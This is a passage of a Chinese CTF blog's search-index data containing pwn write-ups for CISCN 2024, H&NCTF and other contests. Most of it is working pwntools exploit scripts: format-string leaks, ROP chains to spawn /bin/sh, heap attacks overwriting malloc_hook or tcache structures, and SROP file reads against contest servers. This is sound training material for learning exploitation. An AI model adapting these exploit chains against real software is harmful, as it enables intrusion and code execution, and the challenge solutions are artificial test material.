绕过伪随机后进入gift函数，第一次格式化字符串泄露canary和程序基地址，第二次栈溢出到后门函数&lt;br&gt;
利用ctypes库在python代码中调用C语言函数，步骤如下：&lt;/p&gt;
&lt;p&gt;1.创建一个C语言源代码文件，假设名为1.c&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;time.h&amp;gt;
void set_seed() 
{
	time_t seed = time(0);
	srand(seed);
}
int random_number() 
{    
	return rand();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2.将其编译为一个动态链接库&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc -shared -o 1.so 1.c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from LibcSearcher import *
import ctypes
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./attachment&amp;quot;)
p = remote(&amp;quot;challenge.qsnctf.com&amp;quot;,31788)
#elf = ELF(&amp;quot;./pwn&amp;quot;)

# 加载动态链接库
lib = ctypes.CDLL(&#39;./1.so&#39;)
lib.random_number.restype = ctypes.c_int
# 调用C语言的set_seed函数
lib.set_seed()
# 调用C语言的random_number函数
result = lib.random_number()
rand = result % 256
print(rand)

def lfsr_h(a1):
    v2 = a1 &amp;gt;&amp;gt; 1
    if (a1 &amp;amp; 1) == 1:
        v2 ^= 0xB8
    return v2

# 初始化
v8 = rand  # 初始值，可以根据需要更改
v12 = v11 = v10 = v9 = 0

# 主循环，进行160次迭代
for i in range(160):
    v8 = lfsr_h(v8)
    
    # 在特定的迭代次数上保存值
    if i == 156:
        v12 = v8
    if i == 157:
        v11 = v8
    if i == 158:
        v10 = v8
    if i == 159:
        v9 = v8
# 输出结果
p.sendlineafter(b&#39;token: &#39;,b&amp;quot;DRKCTF{P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie}&amp;quot;)

print(f&amp;quot;v12: {v12}&amp;quot;)
print(f&amp;quot;v11: {v11}&amp;quot;)
print(f&amp;quot;v10: {v10}&amp;quot;)
print(f&amp;quot;v9: {v9}&amp;quot;)
x = (( v9 - v10 ) * v11 ) % v12
p.sendlineafter(b&#39;?&#39;,str(x))

p.sendlineafter(&#39;gift:\n&#39;,b&amp;quot;%11$p-%13$p&amp;quot;)
p.recvuntil(&amp;quot;0x&amp;quot;)
canary = int(p.recv(16)  ,16)
print(&amp;quot;canary = &amp;quot;,hex(canary))
p.recvuntil(&amp;quot;-&amp;quot;)
backdoor = int(p.recv(16)  ,16) - 1131 - 0x1BD7 + 0x1426
print(&amp;quot;backdoor = &amp;quot;,hex(backdoor))
#gdb.attach(p)
payload = b&#39;a&#39;*40 + p64(canary) + p64(0) + p64(backdoor)
p.send(payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">龙CTF</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/ciscn2024/"" data-c="
          &lt;h1 id=&#34;gostack&#34;&gt;gostack&lt;/h1&gt;
&lt;p&gt;go语言编写的栈溢出，貌似fun2就是后门函数，但是确实逆不懂，可以&lt;code&gt;cyclic 0x200&lt;/code&gt;利用go语言程序栈溢出后会打印出栈的相关信息，所以得到&lt;img src=&#34;https://l1u66.github.io//post-images/1722410742360.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;em&gt;runtime: unexpected return pc for main.main.func3 called from 0x6361616161616169&lt;/em&gt;&lt;br&gt;
然后&lt;code&gt;cyclic -l 0x6361616161616169&lt;/code&gt;即可得到填充字节个数&lt;img src=&#34;https://l1u66.github.io//post-images/1722410836304.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *

p = process(&amp;quot;./gostack&amp;quot;)

context.log_level = &#39;debug&#39;

# ROPgadget
rdi = 0x4a18a5 #0x00000000004a18a5 : pop rdi ; pop r14 ; pop r13 ; pop r12 ; pop rbp ; pop rbx ; ret
rsi = 0x42138a #0x000000000042138a : pop rsi ; ret
rax = 0x40f984 #0x000000000040f984 : pop rax ; ret
rdx = 0x4944ec #0x00000000004944ec : pop rdx ; ret
ret = 0x40201a #0x000000000040201a : ret
syscall = 0x4616C9 #0x00000000004616C9 : syscall ; ret

addr = 0x5978d8 # 随便找一个能写的地址，不行就换一个

# function
main = 0x04A0AC0

# send
#gdb.attach(p))

# 在addr处写字符串
payload = b&#39;\x00&#39;*464 + p64(rax) + p64(0x0) + p64(rdi) + p64(0) + p64(0)*5 + p64(rsi) + p64(addr) + p64(rdx) + p64(0x30) + p64(syscall)
# 将addr处的字符串作为参数执行sys-execv
payload+= p64(rax) + p64(0x3b) + p64(rdi) + p64(addr) + p64(0)*5 + p64(rsi) + p64(0) + p64(rdx) + p64(0) + p64(syscall)

p.sendlineafter(b&#39;Input your magic message :&#39;,payload)

p.recvuntil(b&#39;Your magic message :&#39;)
p.sendline(b&#39;/bin/sh\x00&#39;)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;orange_cat_diary&#34;&gt;orange_cat_diary&lt;/h1&gt;
&lt;p&gt;2.23的libc，无限制的add和edit，show和free只有一次，并且只能对新申请的chunk进行操作，存在8字节溢堆出和uaf漏洞，题目提示打house of orange，堆覆盖到top chunk将其只保留后三位（十六进制），然后申请一个0x1000的堆，top chunk就会到unsorted bin中，可借此泄露libc地址，然后利用uaf和唯一的一次free机会修改fastbin的fd指针，申请到malloc_hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
p = process(&#39;./orange_cat_diary&#39;)
elf = ELF(&#39;./orange_cat_diary&#39;)
libc = elf.libc

def add(size,content=&amp;quot;name&amp;quot;):
	p.sendlineafter(&amp;quot;choice:&amp;quot;, &amp;quot;1&amp;quot;)
	p.sendlineafter(&amp;quot;content:&amp;quot;, str(size))
	p.sendafter(&amp;quot;content:\n&amp;quot;, content)
	
def show():
	p.sendlineafter(&amp;quot;choice:&amp;quot;, &amp;quot;2&amp;quot;)
    	
def dele():
	p.sendlineafter(&amp;quot;choice:&amp;quot;, &amp;quot;3&amp;quot;)

def edit(size,content):
	p.sendlineafter(&amp;quot;choice:&amp;quot;, &amp;quot;4&amp;quot;)
	p.sendlineafter(&amp;quot;content:&amp;quot;, str(size))
	p.sendlineafter(&amp;quot;content:\n&amp;quot;, content)

p.sendafter(&#39;name.\n&#39;,b&#39;name&#39;)

gdb.attach(p,&amp;quot;bp $rebase(0xEDA)&amp;quot;)
add(0x18)
edit(32,b&#39;a&#39;*0x18+p64(0xfe1))
add(0x1000)
add(0x10,b&#39;\x78&#39;)
show()
p.recvuntil(&#39;\x7f&#39;)
main_arena = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 88
libc_base = main_arena + 88 - 3953032
print(&amp;quot;libc_base = &amp;quot;,hex(libc_base))

malloc_hook = main_arena - 0x10 - 1536 - 16
print(&amp;quot;malloc_hook = &amp;quot;,hex(malloc_hook))
onegadget = [0x4527a,0xf03a4,0xf1247]
one_gadget = libc_base + onegadget[1]

add(0x68)
dele()
edit(0x68,p64(malloc_hook-35))
add(0x68)
add(0x68,b&#39;\x00&#39;*19 + p64(one_gadget))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;ezbuf&#34;&gt;ezbuf&lt;/h1&gt;
&lt;p&gt;protobuf的板子题（高版本double free,注意tcache堆块需要末尾某0对齐），2.35的libc，只允许10次free和2次的show且限制的add大小为0x30（chunk大小为0x40），动态调试+分析协议（详情见另一篇介绍protobuf的文章）后发现在解包时会创建两个堆块，第一个是固定0x50大小，另一个是储存content的堆块，根据其大小分配的堆块（相当于多了一个add功能，且不限制大小）&lt;/p&gt;
&lt;h2 id=&#34;攻击思路&#34;&gt;攻击思路&lt;/h2&gt;
&lt;p&gt;该题使用的是_exit(0)退出程序，无法攻击IO，所以打堆栈结合，利用fastbin double free劫持tcache_perthread_struct中储存0xf0大小的chuank链表头，修改为tcache_perthread_struct的地址，从而劫持tcache_perthread_struct，就可以申请到任意地址堆块，前面泄露堆地址和libc地址时已经用了两次show了，所以通过劫持stdout结构体泄露栈地址，最后布置rop链到栈上（劫持的是sub_1C87函数的返回地址）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
import heybro_pb2

p = process(&amp;quot;./pwn&amp;quot;)
#p = remote(&amp;quot;pwn.challenge.ctf.show&amp;quot;,28127)
elf = ELF(&amp;quot;./pwn&amp;quot;)
remote_libc = ELF(&amp;quot;./libc.so.6&amp;quot;)
local_libc = ELF(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)
libc = remote_libc

context.log_level = &#39;debug&#39;
#context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]

def create(idx,content):
    data = heybro_pb2.heybro()
    data.whattodo = 1
    data.whatcon = content
    data.whatidx = idx
    data.whatsize = 0
    data.whatsthis = 0
    data = data.SerializeToString()
    p.recvuntil(b&#39;WANT?\n&#39;)
    p.send(data)
 
def delete(idx):
    data = heybro_pb2.heybro()
    data.whattodo = 2
    data.whatcon = b&#39;0&#39;
    data.whatidx = idx
    data.whatsize = 1
    data.whatsthis = 1
    data = data.SerializeToString()
    p.recvuntil(b&#39;WANT?\n&#39;)
    p.send(data)
 
def show(idx):
    data = heybro_pb2.heybro()
    data.whattodo = 3
    data.whatcon = b&#39;0&#39;
    data.whatidx = idx
    data.whatsize = 1
    data.whatsthis = 1
    data = data.SerializeToString()
    p.recvuntil(b&#39;WANT?\n&#39;)
    p.send(data)
 
def do_nothing(content):
    data = heybro_pb2.heybro()
    data.whattodo = 0
    data.whatcon = content
    data.whatidx = 1
    data.whatsize = 1
    data.whatsthis = 1
    data = data.SerializeToString()
    p.recvuntil(b&#39;WANT?\n&#39;)
    p.send(data)    

#gdb.attach(p,&amp;quot;b *$rebase(0x0000000000001AD1)&amp;quot;)
for i in range(9):
	create(i,b&#39;aaaaaaaa&#39;)
show(0)
p.recvuntil(b&#39;aaaaaaaa&#39;)
libc_base = u64(p.recv(6).ljust(8,b&#39;\x00&#39;)) - 2206944
print(&amp;quot;libc_base&amp;quot;,hex(libc_base))
delete(0)
show(0)
p.recvuntil(b&#39;:&#39;)
heap = u64(p.recv(5).ljust(8,b&#39;\x00&#39;))&amp;lt;&amp;lt;12
heap_base = heap - 0x2000
key = heap_base &amp;gt;&amp;gt; 12
print(&amp;quot;heap_base&amp;quot;,hex(heap_base))
for i in range(1,7):
	delete(i)
delete(7)
delete(8)
delete(7)
for i in range(7):
	create(i,b&#39;aaaaaaaa&#39;)
print(&amp;quot;key&amp;quot;,hex(key))

environ = libc_base + libc.sym[&#39;environ&#39;]
stdout = libc_base + libc.sym[&#39;_IO_2_1_stdout_&#39;]

create(7,p64((heap_base+0xf0)^((heap_base+0x004e40)&amp;gt;&amp;gt;12)))
create(0,b&#39;aaaaaaaa&#39;)
create(0,b&#39;aaaaaaaa&#39;)
create(0,p64(0) + p64(heap_base + 0x10))

payload  = p16(0)*2+p16(1)+p16(0)+p16(0)*5+p16(1)
payload  = payload.ljust(0x80,b&#39;\x00&#39;)

payload += p64(0)*2+p64(stdout)+p64(0)+p64(0)*5+p64(heap_base+0x10)
payload  = payload.ljust(0xe0,b&amp;quot;\x00&amp;quot;)
do_nothing(payload)

payload1 = p64(0xfbad1800) + p64(0)*3 + p64(environ) + p64(environ + 8)
do_nothing(payload1)
leak = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
stack_addr = leak - 0x1a8 + 0x40
print(&amp;quot;stack_addr&amp;quot;,hex(stack_addr))

pay  = p16(0)*4 + p16(1)
pay  = pay.ljust(0x80,b&#39;\x00&#39;)

pay += p64(0)*4 + p64(stack_addr)
pay  = pay.ljust(0xa0,b&amp;quot;\x00&amp;quot;)
do_nothing(pay)
gdb.attach(p)

pop_rdi = 0x2a3e5 + libc_base
system = libc.sym[&#39;system&#39;] + libc_base
binsh = next(libc.search(b&amp;quot;/bin/sh\x00&amp;quot;)) + libc_base
ret = 0x2a3e6 + libc_base
payload = cyclic(8) + p64(ret) +  p64(pop_rdi) + p64(binsh) + p64(system)
payload = payload.ljust(0x58,b&#39;\x00&#39;)
do_nothing(payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">ciscn2024</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/handnctf/"" data-c="
          &lt;h1 id=&#34;close&#34;&gt;close&lt;/h1&gt;
&lt;p&gt;本校新生赛出过，把输出重定向到输入秒了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;exec 1&amp;gt;&amp;amp;0
cat flag
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;what&#34;&gt;what&lt;/h1&gt;
&lt;p&gt;2.27的libc，uaf改malloc_hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./what&amp;quot;)
p = remote(&amp;quot;hnctf.imxbt.cn&amp;quot;,29947)
elf = ELF(&amp;quot;./what&amp;quot;)

def add(size):
	p.recvuntil(&amp;quot;command:\n&amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;size:\n&amp;quot;)
	p.sendline(str(size))
    
def dele():
	p.recvuntil(&amp;quot;command:\n&amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)

	
def edit(size,string):
	p.recvuntil(&amp;quot;command:\n&amp;quot;)
	p.sendline(&amp;quot;4&amp;quot;)
	p.recvuntil(&amp;quot;idx:\n&amp;quot;)
	p.sendline(str(size))
	p.recvuntil(&amp;quot;content:\n&amp;quot;)
	p.sendline(string)
	
def show(idx):
	p.recvuntil(&amp;quot;command:\n&amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;idx:\n&amp;quot;)
	p.sendline(str(idx))

def exit():
	p.recvuntil(&amp;quot;choice\n&amp;quot;)
	p.sendline(&amp;quot;5&amp;quot;)
	
add(1060)#0
add(24)#1
add(24)#2
dele()
dele()
dele()
show(0)
base = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;)) - 4111520
print(&amp;quot;base = &amp;quot;,hex(base))
onegadget = [0x4f29e,0x4f2a5,0x4f302,0x10a2fc]
one_gadget = base + onegadget[3]

edit(1,p64(base+4111408))

add(24)#0
add(24)#1
edit(1,p64(one_gadget))
#gdb.attach(p)
p.recvuntil(&amp;quot;command:\n&amp;quot;)
p.sendline(&amp;quot;1&amp;quot;)
p.recvuntil(&amp;quot;size:\n&amp;quot;)
p.sendline(str(24))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;ez_pwn&#34;&gt;ez_pwn&lt;/h1&gt;
&lt;p&gt;32位的栈迁移，题本身不难，栈溢出一个ebp的大小，但是32位的做的题太少了，错误频出，注意两点：1.&amp;quot;/bin/sh\x00&amp;quot;字符串的位置应放在调用system函数之后，不然执行函数时容易把字符串覆盖掉&lt;br&gt;
2.system的plt表和system的参数之间应该有四个字节充当fake ebp&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

flag=0
if flag==1:
	p = process(&amp;quot;./pwn&amp;quot;)
	gdb.attach(p)
else:
	p = remote(&amp;quot;hnctf.imxbt.cn&amp;quot;,50025)

pay = b&#39;a&#39;*44
p.sendafter(&amp;quot;name?\n&amp;quot;,pay)

plt = 0x8048400
sys = 0x804857B

base = u32(p.recvuntil(&amp;quot;\xff&amp;quot;)[-4:])
print(&amp;quot;base = &amp;quot;,hex(base))

#payload =  p32(0)*4 + p32(0x8048400) + p32(0) + p32(base-28) + b&#39;cat flag&#39; + p32(0)*2 + p32(base-44)
payload =  p32(0)*4 + p32(0x8048400) + p32(0) + p32(base-28) + b&#39;/bin/sh\x00&#39; + p32(0)*2 + p32(base-44)

p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;idea&#34;&gt;idea&lt;/h1&gt;
&lt;p&gt;32位的ret2libc，开了canary，通过整数溢出有一个格式化字符串可以泄露canary&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
#p = process(&#39;./pwn&#39;)
elf = ELF(&#39;./idea&#39;)
lib = ELF(&#39;./libc-2.23.so&#39;)
p = remote(&#39;hnctf.imxbt.cn&#39;, 56459)

p.recvuntil(b&#39;?&#39;)
p.sendline(b&#39;-1&#39;)
p.recvuntil(b&#39;!&#39;)
p.sendline(b&#39;%7$p&#39;)
p.recvuntil(b&#39;0x&#39;)
canary = int(p.recv(8), 16)
p.recvuntil(b&#39;!&#39;)
payload = b&#39;a&#39; * 32 + p32(canary) + p32(0) * 3 + p32(elf.plt[&#39;puts&#39;]) + p32(elf.sym[&#39;main&#39;]) + p32(elf.got[&#39;puts&#39;])
p.sendline(payload)
base_addr = u32(p.recvuntil(b&#39;\xf7&#39;)[-4:]) - lib.sym[&#39;puts&#39;]
print(hex(base_addr))

system = base_addr + lib.sym[&#39;system&#39;]
binsh = base_addr + next(lib.search(b&#39;/bin/sh&#39;))
p.recvuntil(b&#39;?&#39;)
p.sendline(b&#39;-1&#39;)
p.recvuntil(b&#39;!&#39;)
p.sendline(b&#39;%7$p&#39;)
p.recvuntil(b&#39;!&#39;)
payload = b&#39;a&#39; * 32 + p32(canary) + p32(0) * 3 + p32(system) + p32(elf.sym[&#39;main&#39;]) + p32(binsh)
p.sendline(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">H&NCTF</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/tut-xiao-sai/"" data-c="
          &lt;p&gt;队友太强了，带我库库上分😎&lt;/p&gt;
&lt;h1 id=&#34;ezrop&#34;&gt;ezrop&lt;/h1&gt;
&lt;p&gt;pwn签到题，ret2libc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&#39;./ezrop&#39;)
p = remote(&amp;quot;36.212.170.17&amp;quot;,9997)
elf = ELF(&#39;./ezrop&#39;)

puts_plt = 0x401060
puts_got = 0x403FD8
main_addr = 0x401222
pop_rdi_ret = 0x401183
ret = 0x40101a

#gdb.attach(p)

payload = b&#39;a&#39;*144 + p64(0x404500) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter(&amp;quot;time\n&amp;quot;,payload)

puts_addr=u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))

libc_base = puts_addr - 0x80E50
system_addr = libc_base + 0x50D70
bin_addr = libc_base + 0x1D8678
onegadget = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
one_gadget = libc_base + onegadget[5]#3 4 

print(&amp;quot;base = &amp;quot;,hex(libc_base))
print(&amp;quot;sys = &amp;quot;,hex(system_addr))
print(&amp;quot;bin = &amp;quot;,hex(bin_addr))

#gdb.attach(p)
#pause()
pay = b&#39;b&#39;*144 + p64(0x404220) + p64(one_gadget) #+ p64(ret) + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)
p.sendlineafter(&amp;quot;time\n&amp;quot;,pay)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;orw2&#34;&gt;orw*2&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1715003872143.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;开了沙盒打orw&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1715003881364.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;白给了栈地址和libc地址&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1715003888411.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;查看主逻辑发现存在栈溢出，因为已知栈地址，所以可以把栈迁移到输入的内容上，还有一点就是开了canary，需要在canary的位置输入+号防止改变canary，再有就是要以double形式输入，注意flag.txt的截断问题(格式转换有点丑，轻点骂)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
import struct

#p = process(&#39;./oorrww&#39;)
p = remote(&amp;quot;36.212.170.17&amp;quot;,9998)
elf = ELF(&#39;./oorrww&#39;)

#gdb.attach(p)
re = p.recvuntil(b&#39;!&#39;, drop = True).split()
print(&amp;quot;re =&amp;quot;,re)
num11 = float(re[5])
num1 = struct.unpack(&#39;&amp;lt;Q&#39;, struct.pack(&#39;&amp;lt;d&#39;, num11))[0]
stack = int(hex(num1),16)
print(&amp;quot;stack =&amp;quot;,hex(stack))

binary_data = struct.pack(&#39;&amp;gt;Q&#39;, stack)
stack1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, stack+8)
stack2 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, stack+8*13)
stack3 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

num22 = float(re[6])
num2 = struct.unpack(&#39;&amp;lt;Q&#39;, struct.pack(&#39;&amp;lt;d&#39;, num22))[0]
scanf = int(hex(num2),16)
base = scanf - 0x62090
print(&amp;quot;base =&amp;quot;,hex(base))

leave = base + 0x4da83
print(&amp;quot;leave =&amp;quot;,hex(leave))
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, leave)
leave1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

rdi = base + 0x2a3e5
print(&amp;quot;rdi =&amp;quot;,hex(rdi))
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, rdi)
rdi1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

rsi = base + 0x2be51
print(&amp;quot;rsi =&amp;quot;,hex(rsi))
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, rsi)
rsi1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

rdx_rcx_rbx = base + 0x108b03
print(&amp;quot;rdx_rcx_rbx =&amp;quot;,hex(rdx_rcx_rbx))
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, rdx_rcx_rbx)
rdx_rcx_rbx1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

ope = base + 0x1144E0
print(&amp;quot;ope =&amp;quot;,hex(ope))
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, ope)
ope1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

read = base + 0x1147D0
print(&amp;quot;read =&amp;quot;,hex(read))
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, read)
read1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

write = base + 0x114870
print(&amp;quot;write =&amp;quot;,hex(write))
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, write)
write1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

puts = base + 0x80E50
print(&amp;quot;puts =&amp;quot;,hex(puts))
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, puts)
puts1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

binary_data = struct.pack(&#39;&amp;gt;Q&#39;, 0)
_0 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, 1)
_1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, 3)
_3 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, 0x100)
_100 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, stack - 0x100)
bss = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

#orw
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(1.1205295609968026e+253))#bp  flag.txt
p.sendlineafter(&amp;quot;input:\n&amp;quot;,b&amp;quot;0&amp;quot;)
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(rdi1))#rdi
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(stack3))#flag
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(rsi1))#rsi
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(_0))#0
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(ope1))#open
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(rdi1))#rdi
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(_3))#3
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(rsi1))#rsi
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(bss))#bss
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(rdx_rcx_rbx1))#rdx
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(_100))#0x100
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(1.1205295609968026e+253))#0
p.sendlineafter(&amp;quot;input:\n&amp;quot;,b&amp;quot;0&amp;quot;)#0
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(read1))#read
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(rdi1))#rdi
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(_1))#1
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(write1))#write

p.sendlineafter(&amp;quot;input:\n&amp;quot;,b&amp;quot;+&amp;quot;)
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(stack2))#stack
pause()
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(leave1))#leave

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;sp&#34;&gt;sp&lt;/h1&gt;
&lt;p&gt;相当于xyctf的srop和inviisible_flag（禁用了orw的orw），比赛时把syscall地址给搞错了🤡，到那就挂，测！在xy的srop代码基础上稍微改改就出了（队伍的恶人）,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./sp&amp;quot;)
p = remote(&amp;quot;36.212.170.17&amp;quot;,9999)
elf = ELF(&amp;quot;./sp&amp;quot;)
syscall = 0x4010B0
bss = 0x404260+0x500
rdi = 0x4012ec
leave = 0x4012e2

#gdb.attach(p)
sigframe = SigreturnFrame()
sigframe.rax = 0
sigframe.rdi = 0
sigframe.rsi = 0
sigframe.rdx = bss
sigframe.rcx = 0x800
sigframe.rsp = bss + 16
sigframe.rbp = bss + 0x800
sigframe.rip = syscall

payload = b&amp;quot;a&amp;quot;*24 + p64(bss) + p64(0) + p64(rdi) + p64(0xf) + p64(syscall) + bytes(sigframe)
p.send(payload)

#pause()
flag = bss
sigframe0 = SigreturnFrame()
sigframe0.rdi = constants.SYS_openat
sigframe0.rsi = -100
sigframe0.rdx = flag
sigframe0.rcx = 0
sigframe0.rsp = bss + 0x10 + 256 + 16
sigframe0.rip = syscall

sigframe1 = SigreturnFrame()
sigframe1.rdi = constants.SYS_read
sigframe1.rsi = 3
sigframe1.rdx = bss - 0x100
sigframe1.rcx = 50
sigframe1.rsp = bss + 0x10 + 256*2 + 24 + 8
sigframe1.rip = syscall


sigframe2 = SigreturnFrame()
sigframe2.rdi = constants.SYS_sendfile
sigframe2.rsi = 1
sigframe2.rdx = 3
sigframe2.rcx = 0
sigframe2.r8 = 50
sigframe2.rsp = bss + 0x10 + 256*3
sigframe2.rip = syscall

pay = b&amp;quot;flag.txt&amp;quot; + p64(0) + p64(rdi) + p64(0xf) + p64(syscall) + bytes(sigframe0) + p64(rdi) + p64(0xf) + p64(syscall) + bytes(sigframe2) #+ p64(rdi) + p64(0xf) + p64(syscall) + bytes(sigframe2)
p.send(pay)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;下面是mprotect+shellcode的做法&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./sp&amp;quot;)
